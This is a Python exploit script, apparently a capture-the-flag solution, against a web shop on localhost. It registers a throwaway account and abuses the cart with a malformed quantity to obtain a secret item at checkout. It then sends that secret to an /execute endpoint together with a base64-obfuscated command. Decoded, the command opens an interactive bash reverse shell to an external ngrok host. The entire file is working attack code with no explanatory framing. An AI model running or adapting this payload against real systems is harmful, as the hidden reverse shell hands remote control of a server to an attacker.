import requests
import threading
import random
import string
import json

URL = "http://localhost:1337"
print("Logging IN")

username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

print("Credentials: ", username, password)

try:
    r = requests.post(f'{URL}/register', data={
        'username': username,
        'password': password,
    })
    token = r.json()['token']
    print(r.text)
except:
    r = requests.post(f'{URL}/login', data={
        'username': username,
        'password': password,
    })
    token = r.json()['token']
    print(r.text)

def profile():
    r = requests.get(f'{URL}/profile', headers={
        'Authorization': 'Bearer ' + token,
    })
    print("PROFILE: ", r.text)

def empty_cart():
    r = requests.delete(f'{URL}/cart', headers={
        'Authorization': 'Bearer ' + token,
    })
    print("EMPTY CART: ", r.text)

def req():
    try:
        r = requests.post(f'{URL}/cart', headers={
            'Authorization': 'Bearer ' + token,
        }, data={
            'id': 6,
            'quantity': 'asd'
        })
        print("Adding to CART: ", r.text)
    except:
        pass

def req2():
    r = requests.post(f'{URL}/checkout', headers={
        'Authorization': 'Bearer ' + token,
    })
    print("CHECKING OUT: ", r.text)
    return json.loads(r.text)

def execute(secret):
    r = requests.post(f'{URL}/execute', headers={
        'Authorization': 'Bearer ' + token,
    }, data={
        'secret': secret,
        'command': "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5pbi5uZ3Jvay5pby8xNTMwOSAwPiYx | base64 -d | bash"
    })
    print(r.text)

profile()
empty_cart()
req()
data = req2()
for dd in data:
    if dd.get('id') == 6:
        secret = dd.get('secret')
        execute(secret)
        break